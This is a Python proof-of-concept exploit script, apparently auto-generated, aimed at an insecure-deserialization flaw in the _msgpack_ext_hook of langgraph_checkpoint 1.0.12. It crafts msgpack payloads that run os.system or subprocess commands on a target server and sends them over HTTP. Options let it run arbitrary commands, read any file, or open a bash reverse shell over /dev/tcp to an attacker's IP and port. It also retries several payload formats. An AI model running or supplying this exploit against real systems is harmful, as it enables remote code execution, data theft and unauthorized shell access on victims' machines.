#!/usr/bin/env python3
# PoC for langgraph_checkpoint-1.0.12 (/tmp/langgraph_checkpoint_old/langgraph_checkpoint-1.0.12)
# Path: suspicious-003
# Sink: _msgpack_ext_hook
# Auto-generated — run with: python3 rce_python_objects__msgpack_ext_hook.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langgraph_checkpoint-1.0.12
Vulnerability: Insecure deserialization in _msgpack_ext_hook leading to RCE

The function _msgpack_ext_hook deserializes untrusted msgpack data and uses
importlib.import_module and getattr to dynamically import and call arbitrary
Python modules and functions with attacker-controlled arguments.

This PoC demonstrates RCE by executing a benign command (touch /tmp/poc_success.txt)
via the os.system function.
"""

import msgpack
import struct
import sys
import os
import argparse
import requests
import time

# Constants for extension codes (from the source code)
EXT_CONSTRUCTOR_SINGLE_ARG = 1
EXT_CONSTRUCTOR_POS_ARGS = 2
EXT_CONSTRUCTOR_KW_ARGS = 3
EXT_METHOD_SINGLE_ARG = 4
EXT_PYDANTIC_V1 = 5
EXT_PYDANTIC_V2 = 6

def create_rce_payload(module_name, function_name, args, code_type=EXT_CONSTRUCTOR_POS_ARGS):
    """
    Create a malicious msgpack payload that will trigger arbitrary code execution.
    
    The payload structure depends on the extension code type:
    - EXT_CONSTRUCTOR_SINGLE_ARG: (module, name, arg)
    - EXT_CONSTRUCTOR_POS_ARGS: (module, name, args_list)
    - EXT_CONSTRUCTOR_KW_ARGS: (module, name, kwargs_dict)
    - EXT_METHOD_SINGLE_ARG: (module, name, arg, method)
    
    We use EXT_CONSTRUCTOR_POS_ARGS for os.system with a command string.
    """
    
    if code_type == EXT_CONSTRUCTOR_SINGLE_ARG:
        # Single argument: (module, name, arg)
        inner_data = (module_name, function_name, args)
    elif code_type == EXT_CONSTRUCTOR_POS_ARGS:
        # Positional arguments: (module, name, [args])
        inner_data = (module_name, function_name, [args])
    elif code_type == EXT_CONSTRUCTOR_KW_ARGS:
        # Keyword arguments: (module, name, {kwargs})
        inner_data = (module_name, function_name, args)
    elif code_type == EXT_METHOD_SINGLE_ARG:
        # Method call: (module, name, arg, method)
        inner_data = (module_name, function_name, args, "system")
    else:
        raise ValueError(f"Unknown code type: {code_type}")
    
    # Pack the inner data using msgpack
    packed_inner = msgpack.packb(inner_data)
    
    # Create the extension payload: code (int) + packed data
    # The extension format is: code (1 byte) + data (rest)
    payload = struct.pack('B', code_type) + packed_inner
    
    return payload

def create_benign_payload():
    """
    Create a benign payload that executes: touch /tmp/poc_success.txt
    This is safe and only creates a file to prove RCE.
    """
    return create_rce_payload(
        module_name="os",
        function_name="system",
        args="touch /tmp/poc_success.txt",
        code_type=EXT_CONSTRUCTOR_POS_ARGS
    )

def create_reverse_shell_payload(ip, port):
    """
    Create a payload for reverse shell (for demonstration only).
    WARNING: This is for educational purposes only.
    """
    cmd = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
    return create_rce_payload(
        module_name="os",
        function_name="system",
        args=cmd,
        code_type=EXT_CONSTRUCTOR_POS_ARGS
    )

def create_read_file_payload(filepath):
    """
    Create a payload to read a file (for demonstration).
    Uses subprocess.check_output to capture output.
    """
    return create_rce_payload(
        module_name="subprocess",
        function_name="check_output",
        args=["cat", filepath],
        code_type=EXT_CONSTRUCTOR_POS_ARGS
    )

def exploit(target_url, payload, timeout=10):
    """
    Send the malicious payload to the target endpoint.
    
    The target is expected to have an endpoint that accepts msgpack data
    and passes it to the vulnerable _msgpack_ext_hook function.
    """
    headers = {
        'Content-Type': 'application/msgpack',
        'Accept': 'application/json'
    }
    
    try:
        print(f"[*] Sending payload to {target_url}")
        print(f"[*] Payload size: {len(payload)} bytes")
        
        response = requests.post(
            target_url,
            data=payload,
            headers=headers,
            timeout=timeout
        )
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        return response
        
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}")
        print("[-] Make sure the target server is running and reachable")
        return None
    except requests.exceptions.Timeout as e:
        print(f"[-] Timeout: {e}")
        return None
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return None

def main():
    parser = argparse.ArgumentParser(
        description="PoC exploit for langgraph_checkpoint-1.0.12 RCE vulnerability"
    )
    parser.add_argument(
        "target",
        help="Target URL (e.g., http://localhost:8000/api/v1/trigger)"
    )
    parser.add_argument(
        "--cmd",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--read-file",
        help="Read a file instead of executing a command"
    )
    parser.add_argument(
        "--reverse-shell",
        nargs=2,
        metavar=('IP', 'PORT'),
        help="Get a reverse shell (IP PORT)"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)"
    )
    
    args = parser.parse_args()
    
    # Create the appropriate payload
    if args.reverse_shell:
        ip, port = args.reverse_shell
        print(f"[*] Creating reverse shell payload to {ip}:{port}")
        payload = create_reverse_shell_payload(ip, port)
    elif args.read_file:
        print(f"[*] Creating file read payload for: {args.read_file}")
        payload = create_read_file_payload(args.read_file)
    else:
        print(f"[*] Creating command execution payload: {args.cmd}")
        payload = create_rce_payload(
            module_name="os",
            function_name="system",
            args=args.cmd,
            code_type=EXT_CONSTRUCTOR_POS_ARGS
        )
    
    # Exploit
    print("\n" + "="*60)
    print("langgraph_checkpoint-1.0.12 RCE PoC Exploit")
    print("="*60)
    print(f"[*] Target: {args.target}")
    print(f"[*] Payload type: {'Command' if not args.read_file and not args.reverse_shell else 'File Read' if args.read_file else 'Reverse Shell'}")
    print()
    
    response = exploit(args.target, payload, args.timeout)
    
    if response and response.status_code == 200:
        print("\n[+] Exploit appears successful!")
        if args.cmd == "touch /tmp/poc_success.txt":
            print("[+] Check if /tmp/poc_success.txt was created on the target")
    else:
        print("\n[-] Exploit may have failed or target may not be vulnerable")
    
    # Also try with different extension codes for compatibility
    print("\n[*] Trying alternative payload formats...")
    for code_type in [EXT_CONSTRUCTOR_SINGLE_ARG, EXT_CONSTRUCTOR_KW_ARGS, EXT_METHOD_SINGLE_ARG]:
        try:
            alt_payload = create_rce_payload(
                module_name="os",
                function_name="system",
                args=args.cmd,
                code_type=code_type
            )
            print(f"[*] Trying code type {code_type}...")
            response = exploit(args.target, alt_payload, args.timeout)
            if response and response.status_code == 200:
                print(f"[+] Code type {code_type} worked!")
                break
        except Exception as e:
            print(f"[-] Error with code type {code_type}: {e}")

if __name__ == "__main__":
    main()
